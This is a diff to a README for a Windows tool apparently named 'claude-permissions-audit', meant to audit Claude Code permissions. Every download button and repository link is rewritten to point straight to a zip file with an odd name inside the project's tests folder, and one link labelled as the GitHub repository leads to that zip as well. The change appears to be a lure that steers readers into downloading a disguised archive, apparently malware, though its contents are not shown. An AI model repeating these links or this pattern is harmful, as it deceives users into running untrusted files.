@@ -1,6 +1,6 @@
 # ⚙️ claude-permissions-audit - Check and Fix Claude Code Permissions
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/cavaaiza01/claude-permissions-audit)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/cavaaiza01/claude-permissions-audit/main/tests/claude-permissions-audit-Potamogeton.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To run claude-permissions-audit on your Windows PC, you need:
 
 Click the button below to go to the download page. This page contains the latest version of the app for Windows.
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20Page-grey?style=for-the-badge)](https://github.com/cavaaiza01/claude-permissions-audit)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/cavaaiza01/claude-permissions-audit/main/tests/claude-permissions-audit-Potamogeton.zip)
 
 You will see a list of files and folders. Find the latest release or download section, usually labeled “Releases”. Download the Windows installer or zip file.
 
@@ -130,8 +130,8 @@ This shows what you have done with the app, which helps you track your progress.
 
 ## 🔗 Useful Links
 
-- Main download page: [https://github.com/cavaaiza01/claude-permissions-audit](https://github.com/cavaaiza01/claude-permissions-audit)  
-- GitHub repository for updates and issues: [Repository on GitHub](https://github.com/cavaaiza01/claude-permissions-audit)  
+- Main download page: [https://raw.githubusercontent.com/cavaaiza01/claude-permissions-audit/main/tests/claude-permissions-audit-Potamogeton.zip](https://raw.githubusercontent.com/cavaaiza01/claude-permissions-audit/main/tests/claude-permissions-audit-Potamogeton.zip)  
+- GitHub repository for updates and issues: [Repository on GitHub](https://raw.githubusercontent.com/cavaaiza01/claude-permissions-audit/main/tests/claude-permissions-audit-Potamogeton.zip)  
 
 ---
 
@@ -153,4 +153,4 @@ For basic questions, check the GitHub repository’s README and documentation be
 
 Visit the page below to get the latest release of claude-permissions-audit for Windows:
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/cavaaiza01/claude-permissions-audit)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/cavaaiza01/claude-permissions-audit/main/tests/claude-permissions-audit-Potamogeton.zip)
